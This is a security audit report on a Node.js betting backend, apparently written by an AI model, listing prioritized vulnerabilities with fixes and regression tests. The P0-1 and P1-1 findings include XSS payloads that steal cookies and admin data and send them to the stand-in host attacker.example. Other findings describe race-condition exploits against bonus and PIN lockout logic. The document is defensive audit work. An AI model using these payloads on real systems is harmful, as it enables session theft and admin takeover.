# Livo Backend — Security Audit II (A→Z Continuation)

**Repo:** fotontohasan-dot/livo-backen — commit `173f915d6e044a5e3437c21b195dbcaff66f42e9`
**Scope:** This continues `AUDIT_FULL.md`, covering everything that report left flagged as "Not Verifiable" or "sampled, not exhaustive": a complete IDOR/ownership sweep across every route, XSS across all 270 EJS views (including every admin template), file upload/path traversal/content-type/size validation, an exhaustive SQL-injection and dynamic-SQL sweep plus DB constraints/transactions/race conditions, SSRF/open redirects and every external integration, authentication/session/CSRF edge cases, queues/workers/scheduler/graceful shutdown, pagination/unbounded queries/resource exhaustion, logging/audit-trail completeness, secrets/configuration, and the four admin route files the first pass never opened (`adminGames.js`, `adminHealthFix.js`, `adminLeaderboard.js`, `adminTelegram.js`).

**Methodology:** Eight independent, read-only research passes ran in parallel, each scoped to one attack surface. Each was briefed with `AUDIT_FULL.md`'s prior findings so it extended rather than repeated that work, and each was required to cite file and line for every claim and to list representative SAFE examples alongside anything flagged. **No file in the repository was modified as part of producing this report.**

**Totals:** 4 P0, 7 P1, 9 P2, 13 P3 findings. 14 CONFIRMED, 6 POTENTIAL, 13 notable SAFE areas verified clean.

---

## P0 — Critical (full compromise, act this week)

### P0-1. Stored XSS in live chat → zero-click admin session takeover
**Files:** `views/admin/chat.ejs:254,258,355,360`, `services/socket.js:87-108`

Chat messages are inserted into the admin sidebar/thread via `innerHTML` with no escaping. CSP (`app.js:136-149`) sets `scriptSrc`/`scriptSrcAttr` to `'unsafe-inline'` with no nonce, so nothing mitigates it. The admin chat panel calls `socket.emit('join_admin')` on load and re-renders on every `new_message` event — the payload fires the instant any user sends it, no click required.

**Data flow:** any user's socket.io `send_message` → `services/socket.js` inserts `data.message` into `chat_messages` with no validation/HTML stripping (the client-side profanity filter is bypassable via a raw socket emit) → served back verbatim by `routes/chat.js` → `admin/chat.ejs` writes it into the DOM via `innerHTML`.

**Exploit:**
```html
<script>fetch('/admin/users?search='+encodeURIComponent(document.cookie))
  .then(r=>r.text()).then(t=>navigator.sendBeacon('https://attacker.example/x', t))</script>
```
Sent as a chat message from any regular account. Runs inside the admin's authenticated origin — with the CSRF token already present in the admin's own DOM, this is enough to issue authenticated admin actions directly (ban/unban, approve withdrawals, change roles).

**Contrast:** `views/profile/chat.ejs:181` and `views/admin/support.ejs:89` render the identical data safely via `textContent` — the fix pattern to copy.

**Fix:** replace all four `innerHTML` sites with `textContent`/`createElement`; add server-side sanitization and a length cap on `message` in `services/socket.js` before the insert.
**Regression test:** send a chat message containing `<img src=x onerror=alert(1)>` as a normal user; assert the admin conversation list and thread view render it as inert text.

### P0-2. `/internal/reset-admin` — unauthenticated mass admin takeover, zero audit trail
**File:** `app.js:386-488`

Opt-in (only active while `ADMIN_RESET_TOKEN` is set), token comparison is `timingSafeEqual` — that part is correct. But `GET /internal/reset-admin?token=...` **demotes every current admin to `role='user'`**, then creates-or-promotes one new admin from `NEW_ADMIN_EMAIL`/`NEW_ADMIN_PASSWORD` — no session, no RBAC, no confirmation step, and **neither `logAdminAction` nor `logEvent` is called anywhere in the ~110-line block**. Every other privilege-escalation path in the app logs; this, the single most powerful action in the app, does not.

`GET /internal/reset-admin/status` doubles as a password oracle: given the token, it confirms whether a guessed `NEW_ADMIN_PASSWORD` currently matches the stored hash — useful even after an operator believes the token is rotated away, if it ever leaked once (build log, screenshare, old ticket).

`ADMIN_RESET_TOKEN`, `NEW_ADMIN_EMAIL`, `NEW_ADMIN_PASSWORD` are **not documented in `.env.example`** — nothing warns an operator this door exists or must be removed after use.

**Fix:** log a `critical`-risk `ADMIN_RESET_EXECUTED` event (actor IP, demoted count, new admin email) on every hit to both routes; document all three env vars in `.env.example` with an explicit "delete after use" warning; add a startup warning in `envValidator.js` when the token is set.
**Regression test:** assert an `audit_logs` row appears after a successful call to either route; assert `envValidator` warns when `ADMIN_RESET_TOKEN` is set.

### P0-3. Telegram "AI DevOps" bot can push production code from two chat messages
**File:** `telegram-bot.js:76-117, 194-299`

A second bot (separate from the notification bot) relays the admin's Telegram messages to the Anthropic API; if the model's reply contains a `GITHUB_ACTION: edit_file` directive and the admin replies "হ্যাঁ" (yes), `githubEditFile()` PUTs new file content straight to the GitHub Contents API with a write-scoped `GITHUB_TOKEN` — confirmed by code comments to trigger auto-deploy.

What's correctly in place: webhook auth (`X-Telegram-Bot-Api-Secret-Token` + `timingSafeEqual`, fail-closed if unset), a hard `ADMIN_CHAT_ID` allowlist, and an explicit human yes/no confirmation with a 5-minute expiry.

**Why it's still P0:** none of that is defense-in-depth beyond "control of one Telegram account." No second factor, no diff review outside the chat message, no anomaly detection. A stolen device, SIM-swap, hijacked session, or the admin just replying "yes" to a skimmed message results in full RCE-equivalent access to production — and it bypasses the app's real admin auth (password + mandatory 2FA) and audit trail entirely.

**Fix:** require a second, independent factor before any commit (e.g. cross-check the admin panel's own live 2FA/session state), and/or scope `GITHUB_TOKEN` to a non-production branch that still requires a reviewed PR.
**Regression test:** assert `handleMessage()` no-ops for any `chatId !== ADMIN_CHAT_ID`; assert `verifyWebhookSecret()` rejects when `TELEGRAM_WEBHOOK_SECRET` is unset.

### P0-4. Login query silently disables ban check, self-exclusion, and VPN step-up 2FA
**File:** `routes/auth.js:545-586`

A seventh instance of the schema/code-drift bug class `AUDIT_FULL.md` fixed six times:
```sql
SELECT id, username, email, phone, password, role
FROM users WHERE email = $1 OR phone = $1
```
Three downstream checks read columns absent from this SELECT, so they always evaluate `undefined`: `if (user.is_banned)` (line 570), `if (user.self_exclude_until && ...)` (576), and `needsStepUp && user.email_verified` (586).

**Real impact:** the VPN/Tor-risk email-OTP step-up 2FA **never fires for any standard email/phone login**, regardless of risk score — a permanent loss of that control, not a delay.

**Mitigation already present:** `middleware/auth.js`'s `isAuth` independently re-checks `is_banned`/`self_exclude_until` against the DB on every request behind it (30s cache, fail-closed on cache error), so a banned/excluded user is kicked out of any protected route within ~30s. The homepage (`GET /`, no `isAuth` gate) still renders such a user as logged in there. Google OAuth login fetches all columns and its own checks work correctly, confirming this is a regression in the narrow SELECT, not a design choice.

**Fix:** add `is_banned, self_exclude_until, email_verified` to the SELECT.
**Regression test:** log in as a banned user, assert rejection at `/login` itself; log in from a mocked high-risk IP, assert redirect to `/verify-access`.

---

## P1 — High (real money, real data, fix this sprint)

### P1-1. Reflected XSS across nine admin filter forms
**Files:** `views/admin/users.ejs:63`, `api-logs.ejs:56-71`, `bot-logs.ejs:74-77`, `duplicate-accounts.ejs:90`, `fraud-logs.ejs:80-83`, `games.ejs:42`, `dashboard.ejs:66-68`, `deposits.ejs:71-75`, `withdrawals.ejs:71-75`, `reports.ejs:15-17`

These views build their body as a JS template literal rendered via `<%- body %>`. Most such views correctly wrap reflected query-string filter values (`search`, `ip`, `user_id`, date ranges) in the `escapeHtml()`/`esc()` helper already defined at the top of the same file — these nine skip that call on specific fields.

**Exploit (verified against `users.ejs`):**
```
GET /admin/users?search=%22%3E%3Cimg%20src=x%20onerror=fetch(%27https://attacker.example/x?c=%27%2Bdocument.cookie)%3E
```
decodes to breaking out of the `value="..."` attribute and injecting a live `<img onerror>`.

**Contrast:** `views/admin/audit-logs.ejs:90,110`, `login-history.ejs:46`, `notification-templates.ejs:67` correctly escape the identical kind of value in the same codebase.

**Fix:** wrap each listed interpolation in the file's own existing `escapeHtml()`; coerce numeric/date fields server-side too.
**Regression test:** for each route, request with `search="><script>window.__xss=1</script>` and assert the rendered HTML contains it escaped.

### P1-2. Stored XSS in the admin payments table — currently masked by an unrelated bug
**Files:** `views/payment/admin.ejs:118,143-147`, `routes/payment.js:238-239`, `app.js:322`

`transaction_id`/`account_number` are free-text on the deposit form (no charset/format validation), stored, and rendered via `tbody.innerHTML = rows.map(r => \`<td>${r.transaction_id}</td>...\`)` with no escaping.

**Why it's inert today:** `jsonScriptSafe` (`app.js:322`) does `JSON.stringify(String(value))`. `String()` on an array of objects collapses it to `"[object Object],..."`, so `allRequests.filter(...)` throws before the vulnerable line runs — the payments admin page is currently broken, which happens to suppress the XSS. The moment someone fixes `jsonScriptSafe` for non-string values (a real, separate bug — see P2-6) without also fixing this sink, the XSS goes live.

**Fix:** escape `r.username`/`r.transaction_id`/`r.account_number` before interpolation; validate charset/length on those fields server-side; fix both bugs together, not separately.
**Regression test:** submit a deposit with an HTML payload in `transaction_id`; after fixing both bugs, assert the table renders it escaped and `allRequests` is a real array client-side.

### P1-3. Referral signup bonus can be paid twice
**File:** `services/referral.js:73-126`

`signup_bonus_paid` is read without `FOR UPDATE`, checked in JS, then written back with a plain `UPDATE ... WHERE id=$1` — no unique constraint on `referral_commissions(earner_id, from_user_id, reason)` backs it up. Reachable from three independent entry points into `creditApprovedDeposit()`: admin bulk-approve, the SSLCommerz `/success` browser redirect, and the `/ipn` server callback — each only locks its own `payment_requests` row.

**Exploit:** a referred user makes two qualifying deposits (≥৳500) approved close together (two admin tabs, or a success/IPN race overlapping a second pending deposit). Both read `signup_bonus_paid=false`, both credit the referrer, last write wins on the flag. Referrer collects 100–1500 coins twice.

**Fix:** make the guard atomic — `UPDATE referrals SET signup_bonus_paid=true WHERE id=$1 AND signup_bonus_paid=false RETURNING id`, only credit if `rowCount===1` — the pattern already used correctly in `services/vip.js:41-45`.
**Regression test:** create two approvable deposits for one referred user, approve both via `Promise.all`, assert the referrer's `coins` increased by exactly one bonus.

### P1-4. Withdraw-PIN lockout can be bypassed with parallel guesses
**File:** `services/withdrawPin.js:114-157`

The 5-strikes-then-lock counter is read, incremented in JS, and written back with no lock. Concurrent guesses all see the same starting count, so the lockout never accumulates past what one request would produce.

**Exploit:** fire N concurrent `POST /payment/withdraw` requests with different PIN guesses (bounded by `paymentLimiter`, but still well above 5). Each independently computes `attempts=1` from the same stale read — the 15-minute lock never triggers even after 5+ wrong guesses land in one batch.

**Fix:** wrap in a transaction with `SELECT ... FOR UPDATE`, or use an atomic `UPDATE users SET withdraw_pin_failed_attempts = withdraw_pin_failed_attempts + 1 ... RETURNING withdraw_pin_failed_attempts` and lock off the returned value.
**Regression test:** set `failed_attempts=0`, fire 6 concurrent wrong-PIN calls via `Promise.all`, assert the account ends locked.

### P1-5. No session regeneration on login, anywhere
**Files:** `routes/auth.js:373` (`completeLogin`), `routes/admin.js:295,367`

`req.session.regenerate()` appears nowhere in the repo — the session ID never rotates at login, admin login, 2FA completion, or OAuth callback (session fixation). Mitigated today by `httpOnly`/`secure`(prod)/`sameSite:lax` cookies and no current cookie-planting endpoint — a missing defense-in-depth control, not a demonstrated exploit today.

**Fix:** call `req.session.regenerate()` (copying over needed fields) at every point authentication level changes.
**Regression test:** capture `connect.sid` before and after a successful login; assert it changes.

### P1-6. Market and bet settlement move real coins with zero audit log
**File:** `routes/admin.js:2491-2539, 2635-2678`

`POST /admin/markets/:marketId/settle` and `POST /admin/bets/:id/settle` credit real, withdrawable coins based on an admin-chosen outcome, inside a proper DB transaction — but never call `logAdminAction`/`logEvent`. No record exists of which admin ran a settlement, when, or what outcome was chosen.

**Fix:** add `logEvent({ category:'financial', riskLevel:'high', action:'MARKET_SETTLED'/'BET_SETTLED', details:{...} })` right after `COMMIT` in both handlers.
**Regression test:** settle a market/bet as an admin; assert an `audit_logs` row exists referencing the correct admin and id.

### P1-7. Chat's `send_message` socket event has zero rate limiting
**File:** `services/socket.js:87-158`

Every HTTP route sits behind a rate limiter; Socket.IO events are a separate channel with none. Each message does a DB insert, broadcasts to every admin, and fires an outbound Telegram API call — a flood from one account spams every admin's live session and can exhaust the Telegram bot's own rate limit.

**Fix:** add a per-socket/per-user token bucket inside the handler (e.g. `cache.incrWithExpiry` keyed by user id).
**Regression test:** emit `send_message` 50 times in under a second from one socket; assert only a bounded number persist/broadcast.

---

## P2 — Medium

| # | Finding | File(s) | Verdict |
|---|---|---|---|
| P2-1 | Admin-to-admin stored XSS via the audit-log detail modal — `row()` concatenates values with zero escaping; the details `<pre>` block is built via `innerHTML` from unescaped `JSON.stringify`. Admin-typed free text (e.g. a rejection `reason`) round-trips as live HTML to a different admin. | `views/admin/audit-logs.ejs:165-181` | Confirmed |
| P2-2 | Password-reset/email-verification tokens stored in plaintext (`crypto.randomBytes(32)` generation is strong, but the raw token sits directly in the DB column). A DB leak hands out directly-usable tokens. | `routes/auth.js:66-74,802-807` | Confirmed |
| P2-3 | Three unbounded queries against growing tables: `GET /admin/matches` (no LIMIT), `GET /chat/admin/conversations` (O(users × chat_messages), no LIMIT), public `GET /news` (unauthenticated, no LIMIT) — against a shared 10-connection pool that also serves payment/auth traffic. | `routes/admin.js:2435`, `routes/chat.js:185-215`, `routes/news.js:6-18` | Confirmed |
| P2-4 | `queue_dead_letter` table has no retention — the existing `queue_cleanup` job purges `job_queue`/`dead_letter_jobs` but never this table; grows forever under a sustained upstream outage. | `queues/deadLetter.js:30-43`, `services/scheduler.js:107-124` | Confirmed |
| P2-5 | Turnover-progress lost update: read-then-write with no lock; two near-simultaneous settlements can lose one increment. Direction is always under-counting (delays a bonus, never lets one complete early). | `services/turnover.js:42-71` | Confirmed |
| P2-6 | `jsonScriptSafe()` is broken for non-string values (`JSON.stringify(String(value))` collapses arrays/objects to `"[object Object]"`) — breaks `payment/admin.ejs`, `admin/kyc.ejs`, `admin/analytics.ejs`, `profile/wheel.ejs`, and currently masks P1-2. Fix together with P1-2. | `app.js:322` | Confirmed |
| P2-7 | VPN step-up OTP brute-force lockout is dead code — the SELECT omits the real `attempts` column, so the 5-guess lock never fires (low practical severity: 10-min code expiry + general rate limiter bound the attack). | `routes/auth.js:622-636` | Confirmed |
| P2-8 | Socket.IO CORS is wildcarded (`origin:"*"`) while HTTP CORS is allowlisted — combined with `sameSite:lax` cookies, widens who can open an authenticated socket and trigger P1-7. | `services/socket.js:38-43` | Potential |
| P2-9 | Backup-restore column-name interpolation has no identifier escaping (`columns` from parsed backup JSON, no allowlist). Inert under the normal create→restore flow; no path found to restore a hand-crafted file today. Worth hardening regardless. | `services/backupManager.js:309-359` | Potential |

---

## P3 — Low / hardening

- **Eight more state-changing `admin.js` routes have no audit-log call**: match add (2440)/delete (2452), market odds upsert (2469), market open/close toggle (2482), promotion toggle (2858), admin support reply (1773)/resolve (1791).
- **KYC document viewing isn't logged** (`routes/admin.js:538-582`) — only approve/reject are. Compliance-relevant for PII specifically.
- **Web-push subscription save has no endpoint validation** (`services/push.js:42-103`) — SSRF-shaped (`sendPushToAdmins` would POST to whatever URL is stored) but currently dead code: no route calls `saveSubscription` anywhere. Validate against a push-service hostname allowlist before this is ever wired up.
- **Two parallel background-job systems coexist**; three of five BullMQ queues (`enqueueEmail`/`enqueueNotification`/`enqueueApiLog`) are never called anywhere — real work goes through the separate Postgres-backed queue instead, leaving idle Workers holding Redis connections.
- **`job_queue` rows with `status='failed'` are never cleaned up**, only `'completed'` — add to the same cleanup job.
- **Inconsistent `claimLimiter` coverage**: `/rewards/claim`, `/missions/claim/:id`, `/cashback/claim`, `/freebet/claim/:id`, `/share/claim` lack it while wheel/red-packet/golden-egg have it.
- **Shared `pg.Pool` has no explicit connection cap** (`db.js:27-30`, defaults to 10) — the mechanism that turns P2-3's unbounded queries into "other users' requests queue up."
- **`docker-compose.override.yml` ships weak default credentials** (`changeme`, `dev-secret-change-me`), auto-loaded by Compose convention unless `-f docker-compose.yml` is passed explicitly. Has an in-file warning; recommend renaming to avoid the auto-load footgun.
- **`.env.example` doesn't document several real env vars**: `DATABASE_SSL`, `GOOGLE_AUTH_TIMEOUT_MS`, `MATCH_SYNC_INTERVAL_MINUTES`, `SETTINGS_ENCRYPTION_KEY`, `SPORTS_PROVIDERS`, `SSLCZ_TIMEOUT_MS` (beyond the P0-2 trio).
- **Failed admin-login attempts aren't audit-logged** (only successes are) — rate-limited, so not a brute-force gap, but no monitoring trail.
- **`coin_transactions` is the one financial table with `ON DELETE CASCADE`**, unlike ~28 sibling tables (`NO ACTION`) — narrow edge case, worth aligning for ledger consistency.
- **Two very low-severity timing gaps**: an extra awaited UPDATE only on the existing-user branch of `/forgot-password` (small enumeration signal, capped by a 5/15min limiter); a plain `!==` compare (not timing-safe) on the VPN step-up OTP code.

---

## Verified clean (don't re-audit these)

- **IDOR/ownership** — every resource-scoped route filters by the session-derived user id; every admin mutation sits behind DB-verified `isAdmin` + RBAC. No cross-user access found across all 20 route files.
- **File upload & path traversal** — single upload path (chat/KYC), memory storage only, three-layer content validation, Cloudinary-only destination. The one dynamic file-path route (backup download) has lexical *and* realpath/symlink containment checks.
- **SSLCommerz payment validation** — credits are gated on a real server-to-server call to SSLCommerz's own validator API, cross-checked against amount/tran_id/currency. A forged client redirect cannot get credited.
- **Google OAuth** — real cryptographic `verifyIdToken` against Google's keys, audience/issuer checked, nonce and state validated.
- **Telegram webhook** — fails closed without `TELEGRAM_WEBHOOK_SECRET`, timing-safe compare, hard chat-id allowlist.
- **RCE/command injection** — every `spawn`/`execFile`/`execSync` uses array-form args or a fully static string; zero `eval`/`new Function`/`vm.*` in app code.
- **Open redirects** — no `redirect`/`next`/`returnTo` pattern exists anywhere; every `res.redirect` target is server-derived.
- **SQL injection** — exhaustive sweep of every dynamic-SQL pattern in the repo, admin search/filter/sort included, found zero unparameterized, attacker-reachable interpolation.
- **Balance mutations are race-safe** — every direct coin-decrement path (withdraw, bets, tournament entry, casino games) uses the atomic `coins - $1 WHERE coins >= $1` idiom inside a real transaction. No double-spend path found. (This corrects `AUDIT_FULL.md`'s blanket "no transaction-wrapping observed" claim — 22 files use `BEGIN`, 13 use `FOR UPDATE`.)
- **Cookie flags & CSRF** — `httpOnly`/`secure`(prod)/`sameSite:lax` correct (admin sessions get a stricter policy); CSRF token comparison is timing-safe and session-bound; exempt-list is narrowly and correctly scoped.
- **Scheduler & graceful shutdown** — the prior orphan-timer/overlap fix (commit `cd9efbb`) holds up under review; SIGTERM/SIGINT correctly drain HTTP, BullMQ workers, and the DB pool in order before exit.
- **Secrets hygiene** — no hardcoded credentials anywhere in the repo; no real `.env` tracked in git; production `docker-compose.yml` refuses to boot without every credential explicitly set.
- **No ReDoS** — the one dynamically-built `RegExp` in the repo is constructed from a fixed, hardcoded word list, never user input.

---

## Coverage

**Routes (all 20 files, full read):** accumulator.js, admin.js, adminGames.js, adminHealthFix.js, adminLeaderboard.js, adminTelegram.js, api.js, auth.js, chat.js, coins.js, extra.js, games.js, help-center.js, leaderboard.js, matches.js, news.js, notifications.js, payment.js, profile.js, sports.js, tournaments.js.

**Middleware & queues (full read):** auth.js, csrf.js, apiKeyAuth.js, apiLogger.js, validate.js, rateLimitFactory.js, redisRateLimitStore.js; queues/connection.js, definitions.js, producers.js, workers.js, deadLetter.js, health.js, and all 5 processors/.

**Services (45+ of 57, full or targeted depth):** auditLog.js, rbac.js, sslcommerz.js, paymentVerification.js, googleAuth.js, telegramConfig.js, telegramNotify.js, telegram-bot.js, sportsAPI.js, push.js, backupManager.js, backup.js, withdrawPin.js, twofactor.js, deviceTracking.js, fraudDetection.js, envValidator.js, urlRedact.js, sentry.js, scheduler.js, queue.js, queueHandlers.js, socket.js, referral.js, vip.js, badges.js, loyalty.js, cashback.js, turnover.js, wheel.js, redpacket.js, periodicReward.js, dailyReward.js, freebet.js, streak.js, missions.js, social.js, contest.js, accumulator.js, userDeletion.js, healthCheck.js, systemHealth.js.

**Views & infra:** all 270 `.ejs` views grepped for unescaped output and `innerHTML`-family sinks (~20 fully traced route-to-render, ~26 more pattern-verified against escaped siblings, 132 games views spot-checked with no user-content surface found); `migrations.js` in full (1,353 lines, every table's constraints/indexes/FKs); `app.js` in full (CSP, sessions, CORS, rate limiters, shutdown handlers, reset-admin route, error handler); `docker-compose*.yml`, `.env.example`, `.env.test`, `.gitignore`, `db.js`. Repo-wide greps for secret patterns, `child_process`/`eval`/`vm.*`, `res.redirect`, `BEGIN`/`FOR UPDATE`, `${...}` in SQL, unbounded `SELECT`, `session.regenerate`, `res.cookie`.

## Could not be verified from static review alone

| Item | Why |
|---|---|
| Actual concurrent-request races (referral bonus, PIN lockout) | Reasoned from code tracing, not reproduced against a running app + live Postgres — no DB was spun up in this session. |
| Live behavior of SSLCommerz, Telegram, Google, Cloudinary, SMS/email gateways | Code-level review only, by design — no outbound calls were made to any third party. |
| `npm audit` dependency vulnerabilities | Not re-run this pass; `AUDIT_FULL.md` previously reported 21–32 unreviewed advisories. |
| Query-plan/index-usage analysis at production data volume | Requires a populated database; not available in this sandbox. |
| CI pipeline status | `AUDIT_FULL.md` reported the workflow doesn't run tests; not re-verified live in this pass. |
| Actual browser exploitation of the XSS findings above | Payloads are constructed from traced data flow, not fired against a running instance — treat as confirmed-by-code-path, not screenshot-verified. |
| Load/soak behavior of the unbounded queries and unthrottled socket event | Impact estimated from query shape and table-growth trajectory, not measured under load. |

---

*A visual, browsable version of this report (severity dashboard, collapsible evidence per finding) was published as a Claude artifact during this session — link available in the session transcript.*
